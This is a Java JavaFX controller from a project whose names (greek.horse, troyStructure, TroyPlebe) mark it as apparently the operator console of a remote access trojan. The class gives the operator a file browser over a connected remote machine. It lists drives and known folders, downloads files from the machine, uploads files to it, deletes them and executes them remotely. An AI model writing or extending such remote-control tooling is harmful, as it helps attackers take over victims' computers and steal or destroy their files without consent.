package greek.horse.server.ui.controllers;

import greek.horse.models.FileBrowserResponseWrapper;
import greek.horse.models.FileStruct;
import greek.horse.models.TableFile;
import greek.horse.server.troyStructure.TroyPlebe;
import greek.horse.server.ui.formmaters.FileRowsFactory;
import greek.horse.server.ui.formmaters.FormattedTableCellFactory;
import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.control.*;
import javafx.scene.image.ImageView;
import javafx.scene.input.KeyCode;
import javafx.scene.input.KeyEvent;
import javafx.scene.paint.Color;
import javafx.scene.text.Font;
import javafx.scene.text.TextAlignment;
import javafx.stage.DirectoryChooser;
import javafx.stage.FileChooser;
import javafx.stage.Stage;
import javafx.util.Duration;
import org.apache.log4j.Logger;
import org.jetbrains.annotations.NotNull;

import javax.swing.filechooser.FileSystemView;
import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;

public class FileBrowserController {
    public TextField pathTextField;
    public TableView<TableFile> listTable;
    public TableView<TableFile> drivesTable;

    public TableColumn<TableFile, ImageView> iconDrivesColumn;
    public TableColumn<TableFile, ImageView> iconListColumn;
    public TableColumn<TableFile, String> nameDriveColumn;
    public TableColumn<TableFile, String> nameListColumn;
    public TableColumn<TableFile, String> sizeListColumn;
    public TableColumn<TableFile, String> sizeDrivesColumn;
    public Label statusLabel;

    private TroyPlebe plebe;
    private Stage stage;
    private final ArrayList<TableFile> knownFolders = new ArrayList<>();
    private Path tempFolder;
    private Path actualPath;
    private static final Logger log = Logger.getLogger(FileBrowserController.class);
    private String title;

    public void loadFolder(Path dir) {
        try {
            Object future = this.plebe.getFiles(dir).getReceivedObj();
            FileBrowserResponseWrapper wrapper = (FileBrowserResponseWrapper) future;

            if (setLabelFromWrapper(wrapper)) {
                return;
            }
            pathTextField.setText(dir.toString());
            pathTextField.setDisable(false);

            List<TableFile> tableFilesList = getTableFileList(wrapper.getList());
            listTable.getItems().clear();

            if (dir.getParent() != null) {
                listTable.getItems().add(new TableFile(new FileStruct("..", 0, dir.getParent().toString(), false, true)));
            }
            this.actualPath = dir;
            listTable.getItems().addAll(tableFilesList);
        } catch (Exception e) {
            log.error("Error loading folder: ", e);
            setStatusLabel(e.getClass().getSimpleName() + ": " + e.getLocalizedMessage(), Color.RED);
        }
    }

    @NotNull
    private List<TableFile> getTableFileList(List<FileStruct> list) {
        return list.stream().map(TableFile::new).collect(Collectors.toList());
    }


    private void loadDrives() {
        try {
            Object drives = this.plebe.getDrives().getReceivedObj();
            List<TableFile> drivesList = getTableFileList((List<FileStruct>) drives);
            drivesTable.getItems().clear();
            drivesTable.getItems().addAll(drivesList);
        } catch (Exception e) {
            log.error("Error loading drives", e);
        }

    }

    public void runFromRow(TableRow<TableFile> row) {
        try {
            Object resp = this.plebe.runFile(getPathFromRow(row)).getReceivedObj();
            FileBrowserResponseWrapper wrapper = (FileBrowserResponseWrapper) resp;
            setLabelFromWrapper(wrapper);
        } catch (Exception e) {
            log.error("Error loading from row: ", e);
        }
    }

    public void uploadAction(Path path, boolean tryToGetParent) {
        FileChooser chooser = new FileChooser();
        chooser.setTitle("Choose file to upload");
        chooser.setInitialDirectory(FileSystemView.getFileSystemView().getHomeDirectory());
        File file = chooser.showOpenDialog(stage);

        if (file == null) {
            setStatusLabel("No file was chosen", Color.RED);
            return;
        }

        Path folder = path.getParent();
        if (!tryToGetParent || folder == null) {
            folder = path;
        }

        byte[] bytes;
        try {
            bytes = Files.readAllBytes(Path.of(file.toURI()));
        } catch (IOException e) {
            log.error("Error reading file: ", e);
            return;
        }

        try {
            Object resp = this.plebe.uploadFile(folder, file.getName(), bytes).getReceivedObj();
            FileBrowserResponseWrapper wrapper = (FileBrowserResponseWrapper) resp;
            setLabelFromWrapper(wrapper);

            loadFromTextField();
        } catch (Exception e) {
            log.error("Error uploading file: ", e);
        }
    }

    public void deleteFromRow(TableRow<TableFile> row) {
        try {
            Path path = getPathFromRow(row);

            if (getUserConfirmation(path.toString())) {
                try {
                    FileBrowserResponseWrapper wrapper = (FileBrowserResponseWrapper) this.plebe.deleteFile(path).getReceivedObj();
                    setLabelFromWrapper(wrapper);
                    loadFromTextField();
                } catch (Exception e) {
                    log.error("Error deleting file: ", e);
                }
            } else {
                setStatusLabel("Nothing done. Deletion aborted.", Color.BLACK);
            }

        } catch (Exception e) {
            log.error("Error deleting file", e);
        }
    }

    private void formatContent() {
        drivesTable.getColumns().forEach(c -> c.setCellFactory(new FormattedTableCellFactory<>()));
        listTable.getColumns().forEach(c -> c.setCellFactory(new FormattedTableCellFactory<>()));

        nameListColumn.setCellFactory(new FormattedTableCellFactory<>(TextAlignment.LEFT));
        nameDriveColumn.setCellFactory(new FormattedTableCellFactory<>(TextAlignment.LEFT));

        iconDrivesColumn.setCellValueFactory(c -> {
//            log.info(c.getValue());
            return c.getValue().iconProperty();
        });
        iconListColumn.setCellValueFactory(c -> c.getValue().iconProperty());

        nameDriveColumn.setCellValueFactory(c -> c.getValue().nameProperty());
        nameListColumn.setCellValueFactory(c -> c.getValue().nameProperty());
        sizeListColumn.setCellValueFactory(c -> c.getValue().sizeProperty());
        sizeDrivesColumn.setCellValueFactory(c -> c.getValue().sizeProperty());

        drivesTable.setRowFactory(new FileRowsFactory(this, true));
        listTable.setRowFactory(new FileRowsFactory(this, false));

        statusLabel.setOnMouseEntered(event -> {
            Tooltip tp = new Tooltip(statusLabel.getText());
            tp.setShowDuration(Duration.INDEFINITE);
            tp.setShowDelay(Duration.ZERO);
            tp.setFont(Font.font(14));
            statusLabel.setTooltip(new Tooltip(statusLabel.getText()));
        });

        loadDrives();
        gotoHUB(null);
    }


    private boolean setLabelFromWrapper(FileBrowserResponseWrapper wrapper) {
        if (wrapper.isError()) {
            setStatusLabel(wrapper.getDescription(), Color.RED);
            return true;
        } else {
            setStatusLabel("OK", Color.BLACK);
            return false;
        }
    }

    public void setStatusLabel(String text, Color color) {
        Platform.runLater(() -> {
            statusLabel.setText(text);
            statusLabel.setTextFill(color);
        });
    }

    public void begin() {
        new Thread(this::formatContent).start();
    }

    public void loadFolderFromRow(TableRow<TableFile> row) {
        try {
            loadFolder(getPathFromRow(row));
        } catch (Exception e) {
            log.error("Error loading from row: ", e);
        }
    }

    private Path getPathFromRow(TableRow<TableFile> row) {
        return row.getItem().getPath();
    }

    public void enterDetection(KeyEvent keyEvent) {
        if (keyEvent.getCode().equals(KeyCode.ENTER)) {
            loadFromTextField();
        }
    }

    public void loadFromTextField() {
        loadFolder(actualPath);
    }

    public void uploadFromRow(TableRow<TableFile> row) {
        Path path;
        boolean getParent;
        try {
            path = getPathFromRow(row);
            getParent = true;
        } catch (Exception e) {
            log.warn("Failed to get row URI, using actualPath");

            if (actualPath == null) {
                log.error("Failed to upload file", e);
                return;
            } else {
                path = actualPath;
                getParent = false;
            }

        }
        uploadAction(path, getParent);
    }

    public void gotoHUB(ActionEvent event) {
        try {
            if (knownFolders.size() != 0) {
                listTable.getItems().clear();
                listTable.getItems().addAll(knownFolders);
            } else {
                FileBrowserResponseWrapper wrapper = (FileBrowserResponseWrapper) this.plebe.getKnownFolders().getReceivedObj();
                listTable.getItems().clear();
                listTable.getItems().addAll(getTableFileList(wrapper.getList()));
                knownFolders.addAll(getTableFileList(wrapper.getList()));
            }
            pathTextField.setText("HUB");
            actualPath = null;
        } catch (Exception e) {
            log.error("Error loading HUB: ", e);
        }
    }

    private boolean getUserConfirmation(String displayPath) {
        Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
        alert.setTitle("Confirmation");
        alert.setHeaderText("Are you sure?");
        alert.setContentText("The file/directory \"" + displayPath + "\" will be permanently deleted.");
        alert.initOwner(stage);

        alert.getButtonTypes().clear();
        alert.getButtonTypes().addAll(ButtonType.YES, ButtonType.CANCEL);

        Optional<ButtonType> buttonType = alert.showAndWait();
        return buttonType.isPresent() && buttonType.get().equals(ButtonType.YES);
    }

    public void downloadFromRow(TableRow<TableFile> row) {
        try {
            Path path = getPathFromRow(row);

            DirectoryChooser chooser = new DirectoryChooser();
            chooser.setTitle("Choose folder to save");
            chooser.setInitialDirectory(FileSystemView.getFileSystemView().getHomeDirectory());
            File dir = chooser.showDialog(stage);

            if (dir == null) {
                setStatusLabel("No folder was chosen", Color.RED);
                return;
            }

            downloadAction(path, Path.of(dir.toURI()));

        } catch (Exception e) {
            log.error("Error downloading file", e);
        }
    }

    private Path downloadAction(Path path, Path directoryUri) {
        try {
            FileBrowserResponseWrapper wrapper = (FileBrowserResponseWrapper) this.plebe.downloadFile(path).getReceivedObj();
            setLabelFromWrapper(wrapper);

            if (wrapper.isError()) {
                return null;
            }
            Path file = Path.of(directoryUri.toString() + File.separator + this.title + " - " + wrapper.getFileData().getFileName());
            Files.write(file, wrapper.getFileData().getFileBytes());
            return file;
        } catch (Exception e) {
            log.error("Error downloading file: ", e);
        }
        return null;
    }

    public void openFromRow(TableRow<TableFile> row) {
        try {
            Path path = getPathFromRow(row);
            Path dir = getTempDir();

            Path file = downloadAction(path, dir);
            Desktop.getDesktop().open(file.toFile());

        } catch (Exception e) {
            log.error("Error opening file", e);
        }
    }

    private Path getTempDir() {
        try {
            if (this.tempFolder == null) {
                this.tempFolder = Files.createTempDirectory("temp_");
            }
            return tempFolder;
        } catch (Exception e) {
            log.error("Error getting temp folder: ", e);
            return null;
        }
    }

    public Stage getStage() {
        return stage;
    }

    public void setStage(Stage stage) {
        this.stage = stage;
    }

    public void setPlebe(TroyPlebe plebe) {
        this.plebe = plebe;
    }

    public void setTitle(String title) {
        this.title = title;
    }
}
